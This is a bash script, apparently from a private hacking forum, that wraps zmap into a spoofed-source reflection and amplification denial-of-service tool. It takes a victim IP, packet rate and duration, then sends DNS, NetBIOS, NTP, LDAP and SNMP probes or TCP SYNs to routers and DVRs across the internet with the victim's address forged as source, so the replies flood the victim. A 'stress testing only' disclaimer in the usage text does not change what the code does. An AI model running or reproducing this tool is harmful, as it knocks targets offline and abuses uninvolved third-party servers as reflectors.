#!/bin/bash
#Zmap IP fake abuse wrapper
additional_args=""

if ! [ -x "$(command -v zmap)" ]; then
  echo 'Error: zmap is not installed.' >&2
  exit 1
fi

if ! [ -x "$(command -v nohup)" ]; then
  echo 'Error: nohup is not installed.' >&2
  exit 1
fi

if ! [ -x "$(command -v timeout)" ]; then
  echo 'Error: timeout is not installed.' >&2
  exit 1
fi

display_usage() {
echo -e "[!] Zmap IP fake abuse wrapper"
echo -e "Made by JiiN - Private for Cyber-Hub.pw"
echo -e "============================================"
echo -e ">> For network stress testing only! <<"
echo -e ">> Users are legally responsible for the illegal usage of this tool <<"
echo -e "============================================\n"

echo -e "Usage: $0 [ip] [abuse_type_number] [pps] [time]\n"
echo -e "Abuses type list:"
echo -e "1- UDP Port 53 DNS"
echo -e "2- UDP Port 137 NETBIOS"
echo -e "3- UDP Port 123 NTP"
echo -e "4- UDP Port 389 LDAP"
echo -e "5- UDP Port 161 SNMP"
echo -e "6- TCP Port 23 TELNET"
echo -e "7- TCP Port 3128 HTTP-PROXY"
echo -e "8- TCP Port 2323 TELNET (Alternative)"
echo -e "9- TCP Port 37215 HUAWEI (Routers)"
echo -e "10- TCP Port 9530 DVR/NVR"
}

if [  $# -le 3 ]
then
display_usage
exit 1
fi

VICTIM=$1
PPS=$3
TIME=$4

if [[ "$2" -eq 1 ]]; then
echo -e "STARTING DNS ABUSE on $VICTIM WITH $PPS pps for $TIME seconds"
nohup timeout $TIME zmap $additional_args --source-ip=$VICTIM --rate=$PPS -M udp -p 53 --probe-args=file:dns_53.pkt -o /dev/null &
fi

if [[ "$2" -eq 2 ]]; then
echo -e "STARTING NETBIOS ABUSE on $VICTIM WITH $PPS pps for $TIME seconds"
nohup timeout $TIME zmap $additional_args --source-ip=$VICTIM --rate=$PPS -M udp -p 137 --probe-args=file:netbios_137.pkt -o /dev/null &
fi

if [[ "$2" -eq 3 ]]; then
echo -e "STARTING NTP ABUSE on $VICTIM WITH $PPS pps for $TIME seconds"
nohup timeout $TIME zmap $additional_args --source-ip=$VICTIM --rate=$PPS -M udp -p 123 --probe-args=file:ntp_123.pkt -o /dev/null &
fi

if [[ "$2" -eq 4 ]]; then
echo -e "STARTING LDAP ABUSE on $VICTIM WITH $PPS pps for $TIME seconds"
nohup timeout $TIME zmap $additional_args --source-ip=$VICTIM --rate=$PPS -M udp -p 389 --probe-args=file:ldap_389.pkt -o /dev/null &
fi

if [[ "$2" -eq 5 ]]; then
echo -e "STARTING SNMP ABUSE on $VICTIM WITH $PPS pps for $TIME seconds"
nohup timeout $TIME zmap $additional_args --source-ip=$VICTIM --rate=$PPS -M udp -p 161 --probe-args=file:snmp_161.pkt -o /dev/null &
fi

if [[ "$2" -eq 6 ]]; then
echo -e "STARTING TELNET ABUSE on $VICTIM WITH $PPS pps for $TIME seconds"
nohup timeout $TIME zmap $additional_args --source-ip=$VICTIM --rate=$PPS -p 23 -o /dev/null &
fi

if [[ "$2" -eq 7 ]]; then
echo -e "STARTING HTTP-PROXY ABUSE on $VICTIM WITH $PPS pps for $TIME seconds"
nohup timeout $TIME zmap $additional_args --source-ip=$VICTIM --rate=$PPS -p 3128 -o /dev/null &
fi


if [[ "$2" -eq 8 ]]; then
echo -e "STARTING TELNET (Alternative) ABUSE on $VICTIM WITH $PPS pps for $TIME seconds"
nohup timeout $TIME zmap $additional_args --source-ip=$VICTIM --rate=$PPS -p 2323 -o /dev/null &
fi

if [[ "$2" -eq 9 ]]; then
echo -e "STARTING HUAWEI (Routers) on $VICTIM WITH $PPS pps for $TIME seconds"
nohup timeout $TIME zmap $additional_args --source-ip=$VICTIM --rate=$PPS -p 37215 -o /dev/null &
fi

if [[ "$2" -eq 10 ]]; then
echo -e "STARTING DVR/NVR ABUSE on $VICTIM WITH $PPS pps for $TIME seconds"
nohup timeout $TIME zmap $additional_args --source-ip=$VICTIM --rate=$PPS -p 9530 -o /dev/null &
fi